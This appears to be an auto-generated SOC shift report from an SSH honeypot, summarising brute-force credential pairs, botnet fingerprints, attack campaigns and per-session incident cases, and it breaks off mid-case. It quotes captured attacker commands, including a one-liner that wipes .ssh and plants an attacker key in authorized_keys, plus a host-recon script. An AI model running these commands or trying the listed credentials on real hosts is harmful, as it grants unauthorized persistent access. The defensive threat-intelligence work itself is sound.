# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-31 |
| **Generated At** | 2026-07-31T21:10:36Z |
| **Shift Time** | 21:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **238** |
| Confirmed Threats | **218** |
| False Positives Filtered | **20** (8.4%) |
| Unique Attacker IPs | **111** |
| Countries of Origin | **31** |
| High Severity Cases | **138** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **100** |
| Malware Samples Analyzed | **3** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **160** |
| Unique Credential Pairs | **96** |
| Unique Usernames | **29** |
| Unique Passwords | **62** |
| Successful Auth Pairs | **138** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `admin` | 25 |
| `user` | 11 |
| `administrator` | 9 |
| `centos` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 129.80.119.236:23` | 16 |
| `` | 6 |
| `12345678` | 5 |
| `password` | 5 |
| `P@ssw0rd` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `user` | `user000` | 4 |
| `supervisor` | `supervisor2017` | 4 |
| `test` | `2222222` | 4 |
| `root` | `smo@@kkklss` | 4 |
| `admin` | `2222` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd` | `80.94.92.179` | 2026-07-31T18:55:23 |
| `root` | `root123` | `80.94.92.55` | 2026-07-31T18:55:53 |
| `user` | `user000` | `124.167.20.72` | 2026-07-31T18:56:33 |
| `user` | `user000` | `14.194.128.158` | 2026-07-31T18:56:41 |
| `user` | `user000` | `10.0.0.73` | 2026-07-31T18:56:55 |
| `root` | `toor` | `80.94.92.55` | 2026-07-31T18:57:56 |
| `root` | `Password1` | `80.94.92.179` | 2026-07-31T18:58:48 |
| `admin` | `000000` | `80.94.92.55` | 2026-07-31T18:59:58 |
| `admin` | `111111` | `80.94.92.55` | 2026-07-31T19:02:01 |
| `root` | `Root123` | `80.94.92.179` | 2026-07-31T19:02:10 |
| `admin` | `123` | `80.94.92.55` | 2026-07-31T19:04:00 |
| `supervisor` | `supervisor2017` | `218.149.235.152` | 2026-07-31T19:05:05 |
| `root` | `` | `94.154.43.220` | 2026-07-31T19:05:06 |
| `supervisor` | `supervisor2017` | `122.160.142.194` | 2026-07-31T19:05:14 |
| `root` | `admin` | `80.94.92.179` | 2026-07-31T19:05:22 |
| `admin` | `123123` | `80.94.92.55` | 2026-07-31T19:05:58 |
| `admin` | `1234` | `80.94.92.55` | 2026-07-31T19:07:57 |
| `root` | `admin123` | `80.94.92.179` | 2026-07-31T19:08:42 |
| `supervisor` | `supervisor2017` | `10.0.0.73` | 2026-07-31T19:08:51 |
| `admin` | `12345` | `80.94.92.55` | 2026-07-31T19:09:54 |
| `ts3` | `teamspeak` | `180.184.183.66` | 2026-07-31T19:10:17 |
| `ts3` | `3245gs5662d34` | `180.184.183.66` | 2026-07-31T19:10:48 |
| `admin` | `123456` | `80.94.92.55` | 2026-07-31T19:11:52 |
| `root` | `alpine` | `80.94.92.179` | 2026-07-31T19:12:09 |
| `admin` | `1234567` | `80.94.92.55` | 2026-07-31T19:13:49 |
| `osmanatmc` | `Acamtanamso1` | `10.0.0.73` | 2026-07-31T19:14:04 |
| `root` | `changeme` | `80.94.92.179` | 2026-07-31T19:15:25 |
| `admin` | `12345678` | `80.94.92.55` | 2026-07-31T19:15:48 |
| `test` | `2222222` | `153.37.177.219` | 2026-07-31T19:16:26 |
| `test` | `2222222` | `62.201.228.210` | 2026-07-31T19:16:33 |
| `guest` | `44` | `50.188.204.213` | 2026-07-31T19:17:30 |
| `admin` | `123456789` | `80.94.92.55` | 2026-07-31T19:17:44 |
| `root` | `default` | `80.94.92.179` | 2026-07-31T19:18:43 |
| `admin` | `1q2w3e4r` | `80.94.92.55` | 2026-07-31T19:19:41 |
| `osmanatmc` | `Acamtanamso1` | `196.189.59.226` | 2026-07-31T19:19:45 |
| `test` | `2222222` | `179.185.1.97` | 2026-07-31T19:19:49 |
| `osmanatmc` | `Acamtanamso1` | `190.12.109.162` | 2026-07-31T19:19:54 |
| `test` | `2222222` | `36.153.164.122` | 2026-07-31T19:19:59 |
| `guest` | `44` | `39.183.162.243` | 2026-07-31T19:20:54 |
| `guest` | `44` | `218.149.228.147` | 2026-07-31T19:21:03 |
| `admin` | `654321` | `80.94.92.55` | 2026-07-31T19:21:38 |
| `root` | `letmein` | `80.94.92.179` | 2026-07-31T19:21:49 |
| `admin` | `Admin123` | `80.94.92.55` | 2026-07-31T19:23:35 |
| `root` | `passw0rd` | `80.94.92.179` | 2026-07-31T19:25:01 |
| `admin` | `P@ssw0rd` | `80.94.92.55` | 2026-07-31T19:25:32 |
| `root` | `1qaz@WSX3edc` | `141.253.107.23` | 2026-07-31T19:27:33 |
| `admin` | `admin` | `80.94.92.55` | 2026-07-31T19:27:54 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-31T19:28:15 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-31T19:28:17 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-31T19:28:23 |
| `user` | `1111111` | `187.218.57.50` | 2026-07-31T19:29:23 |
| `admin` | `passw0rd` | `80.94.92.55` | 2026-07-31T19:29:49 |
| `admin` | `password` | `80.94.92.55` | 2026-07-31T19:32:15 |
| `user` | `1111111` | `10.0.0.73` | 2026-07-31T19:32:59 |
| `admin` | `password1` | `80.94.92.55` | 2026-07-31T19:34:07 |
| `support` | `support` | `10.0.0.73` | 2026-07-31T19:36:00 |
| `admin` | `qwerty` | `80.94.92.55` | 2026-07-31T19:36:57 |
| `GET / HTTP/1.0` | `` | `134.122.85.36` | 2026-07-31T19:37:27 |
| `OPTIONS / HTTP/1.0` | `` | `134.122.85.36` | 2026-07-31T19:37:32 |
| `OPTIONS / RTSP/1.0` | `` | `134.122.85.36` | 2026-07-31T19:37:37 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `134.122.85.36` | 2026-07-31T19:38:15 |
| `GET /v2/_catalog HTTP/1.1` | `Host: 129.80.119.236:23` | `206.81.18.71` | 2026-07-31T19:38:23 |
| `GET /solr/admin/info/system HTTP/1.1` | `Host: 129.80.119.236:23` | `164.92.163.77` | 2026-07-31T19:38:24 |
| `GET /cgi-bin/authLogin.cgi HTTP/1.1` | `Host: 129.80.119.236:23` | `165.22.70.229` | 2026-07-31T19:38:24 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `209.38.237.32` | 2026-07-31T19:38:25 |
| `GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1` | `Host: 129.80.119.236:23` | `207.154.239.237` | 2026-07-31T19:38:26 |
| `GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1` | `Host: 129.80.119.236:23` | `164.92.163.77` | 2026-07-31T19:38:32 |
| `admin1` | `123123` | `80.94.92.55` | 2026-07-31T19:38:50 |
| `admin` | `2222` | `196.189.126.10` | 2026-07-31T19:40:46 |
| `oracle` | `alpine` | `85.105.2.51` | 2026-07-31T19:41:20 |
| `admin1` | `12345` | `80.94.92.55` | 2026-07-31T19:41:56 |
| `admin` | `2222` | `60.172.54.36` | 2026-07-31T19:43:55 |
| `admin1` | `123456` | `80.94.92.55` | 2026-07-31T19:43:57 |
| `admin` | `2222` | `10.0.0.73` | 2026-07-31T19:44:13 |
| `administrator` | `Password123!` | `139.59.6.237` | 2026-07-31T19:46:13 |
| `345gs5662d34` | `345gs5662d34` | `139.59.6.237` | 2026-07-31T19:46:17 |
| `administrator` | `3245gs5662d34` | `139.59.6.237` | 2026-07-31T19:46:19 |
| `admin1` | `password` | `80.94.92.55` | 2026-07-31T19:46:43 |
| `root` | `root2008` | `10.0.0.73` | 2026-07-31T19:47:29 |
| `administrator` | `123123` | `80.94.92.55` | 2026-07-31T19:48:41 |
| `administrator` | `12345` | `80.94.92.55` | 2026-07-31T19:50:52 |
| `root` | `aa@123456` | `179.176.210.17` | 2026-07-31T19:51:20 |
| `345gs5662d34` | `345gs5662d34` | `179.176.210.17` | 2026-07-31T19:51:23 |
| `root` | `3245gs5662d34` | `179.176.210.17` | 2026-07-31T19:51:24 |
| `root` | `root2008` | `203.123.219.137` | 2026-07-31T19:52:37 |
| `administrator` | `123456` | `80.94.92.55` | 2026-07-31T19:52:52 |
| `mysql` | `abcd1234` | `189.52.52.162` | 2026-07-31T19:53:15 |
| `administrator` | `1234567` | `80.94.92.55` | 2026-07-31T19:54:54 |
| `mysql` | `abcd1234` | `222.186.68.153` | 2026-07-31T19:56:39 |
| `mysql` | `abcd1234` | `106.246.89.73` | 2026-07-31T19:56:48 |
| `administrator` | `12345678` | `80.94.92.55` | 2026-07-31T19:56:55 |
| `mysql` | `abcd1234` | `10.0.0.73` | 2026-07-31T19:57:00 |
| `administrator` | `123456789` | `80.94.92.55` | 2026-07-31T19:58:49 |
| `root` | `root2008` | `222.117.176.58` | 2026-07-31T20:00:26 |
| `root` | `root2008` | `111.70.23.253` | 2026-07-31T20:00:40 |
| `administrator` | `password` | `80.94.92.55` | 2026-07-31T20:00:45 |
| `apache` | `12345678` | `80.94.92.55` | 2026-07-31T20:02:45 |
| `apache` | `password` | `80.94.92.55` | 2026-07-31T20:04:38 |
| `debian` | `33` | `202.72.196.75` | 2026-07-31T20:04:49 |
| `debian` | `33` | `112.30.127.9` | 2026-07-31T20:05:02 |
| `centos` | `4444` | `196.189.59.226` | 2026-07-31T20:05:25 |
| `centos` | `4444` | `71.229.1.186` | 2026-07-31T20:05:32 |
| `backup` | `123` | `80.94.92.55` | 2026-07-31T20:06:39 |
| `backup` | `12345678` | `80.94.92.55` | 2026-07-31T20:08:37 |
| `centos` | `4444` | `10.0.0.73` | 2026-07-31T20:09:09 |
| `backup` | `backup` | `80.94.92.55` | 2026-07-31T20:10:33 |
| `backup` | `backup123` | `80.94.92.55` | 2026-07-31T20:12:33 |
| `backup` | `password` | `80.94.92.55` | 2026-07-31T20:14:33 |
| `centos` | `12345678` | `80.94.92.55` | 2026-07-31T20:16:33 |
| `support` | `support` | `176.53.159.196` | 2026-07-31T20:16:39 |
| `centos` | `654321` | `80.94.92.55` | 2026-07-31T20:18:32 |
| `centos` | `centos` | `80.94.92.55` | 2026-07-31T20:20:27 |
| `test` | `11111` | `36.64.33.82` | 2026-07-31T20:20:38 |
| `test` | `11111` | `213.130.207.177` | 2026-07-31T20:20:46 |
| `test` | `11111` | `10.0.0.73` | 2026-07-31T20:21:01 |
| `root` | `@root1234` | `220.250.52.101` | 2026-07-31T20:24:35 |
| `345gs5662d34` | `345gs5662d34` | `220.250.52.101` | 2026-07-31T20:24:39 |
| `root` | `3245gs5662d34` | `220.250.52.101` | 2026-07-31T20:24:41 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-31T20:24:45 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-31T20:24:45 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-31T20:24:46 |
| `oracle` | `P@ssw0rd` | `180.180.232.242` | 2026-07-31T20:29:38 |
| `oracle` | `P@ssw0rd` | `117.2.123.19` | 2026-07-31T20:29:47 |
| `user` | `user88` | `203.110.233.225` | 2026-07-31T20:32:09 |
| `user` | `user88` | `80.233.12.109` | 2026-07-31T20:32:16 |
| `user` | `user88` | `10.0.0.73` | 2026-07-31T20:32:37 |
| `support` | `support2014` | `60.191.58.203` | 2026-07-31T20:33:25 |
| `support` | `support2014` | `187.126.105.42` | 2026-07-31T20:33:38 |
| `admin` | `admin` | `8.208.44.152` | 2026-07-31T20:37:32 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-31T20:37:33 |
| `blank` | `9` | `59.93.36.136` | 2026-07-31T20:41:43 |
| `blank` | `9` | `101.13.4.119` | 2026-07-31T20:45:01 |
| `blank` | `9` | `177.174.0.3` | 2026-07-31T20:45:09 |
| `blank` | `9` | `10.0.0.73` | 2026-07-31T20:45:26 |
| `centos` | `0` | `211.23.109.116` | 2026-07-31T20:52:56 |
| `debian` | `debian123456` | `10.0.0.73` | 2026-07-31T20:53:10 |
| `oracle` | `qwerty` | `175.100.107.238` | 2026-07-31T20:53:27 |
| `oracle` | `qwerty` | `187.8.3.230` | 2026-07-31T20:53:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **238** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 59 |
| OpenSSH | 41 |
| libssh | 20 |
| Paramiko (Python) | 12 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 52 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 41 | 40 |
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `a704be057881...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 52 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 41 | 40 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 51 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`, `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.220`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `220.250.52.101`, `139.59.6.237`, `180.184.183.66`, `179.176.210.17`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **111** |
| Unique ASNs | **69** |
| High-Risk ASNs | **61** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (138)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cbec36cfc0af

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 18:55 |
| **Last Seen** | 2026-07-31 18:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:55:15` | `cowrie.session.connect` |
| `2026-07-31 18:55:16` | `cowrie.client.version` |
| `2026-07-31 18:55:16` | `cowrie.client.kex` |
| `2026-07-31 18:55:23` | `cowrie.login.success` |
| `2026-07-31 18:55:27` | `cowrie.session.params` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.success` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:27` | `cowrie.command.input` |
| `2026-07-31 18:55:29` | `cowrie.log.closed` |
| `2026-07-31 18:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da11f23d9ac7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 18:55 |
| **Last Seen** | 2026-07-31 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:55:51` | `cowrie.session.connect` |
| `2026-07-31 18:55:51` | `cowrie.client.version` |
| `2026-07-31 18:55:51` | `cowrie.client.kex` |
| `2026-07-31 18:55:53` | `cowrie.login.success` |
| `2026-07-31 18:55:55` | `cowrie.session.params` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.success` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.command.input` |
| `2026-07-31 18:55:55` | `cowrie.log.closed` |
| `2026-07-31 18:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b696ceef687

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-31 18:56 |
| **Last Seen** | 2026-07-31 18:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:56:30` | `cowrie.session.connect` |
| `2026-07-31 18:56:31` | `cowrie.client.version` |
| `2026-07-31 18:56:31` | `cowrie.client.kex` |
| `2026-07-31 18:56:33` | `cowrie.login.success` |
| `2026-07-31 18:56:33` | `cowrie.direct-tcpip.request` |
| `2026-07-31 18:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a431114a4fae

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-31 18:56 |
| **Last Seen** | 2026-07-31 18:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:56:39` | `cowrie.session.connect` |
| `2026-07-31 18:56:39` | `cowrie.client.version` |
| `2026-07-31 18:56:39` | `cowrie.client.kex` |
| `2026-07-31 18:56:41` | `cowrie.login.success` |
| `2026-07-31 18:56:41` | `cowrie.direct-tcpip.request` |
| `2026-07-31 18:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6e583d220b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 18:57 |
| **Last Seen** | 2026-07-31 18:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:57:55` | `cowrie.session.connect` |
| `2026-07-31 18:57:55` | `cowrie.client.version` |
| `2026-07-31 18:57:55` | `cowrie.client.kex` |
| `2026-07-31 18:57:56` | `cowrie.login.success` |
| `2026-07-31 18:57:58` | `cowrie.session.params` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.success` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.command.input` |
| `2026-07-31 18:57:58` | `cowrie.log.closed` |
| `2026-07-31 18:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de9f4496bf5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 18:58 |
| **Last Seen** | 2026-07-31 18:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:58:39` | `cowrie.session.connect` |
| `2026-07-31 18:58:41` | `cowrie.client.version` |
| `2026-07-31 18:58:41` | `cowrie.client.kex` |
| `2026-07-31 18:58:48` | `cowrie.login.success` |
| `2026-07-31 18:58:53` | `cowrie.session.params` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.success` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:53` | `cowrie.command.input` |
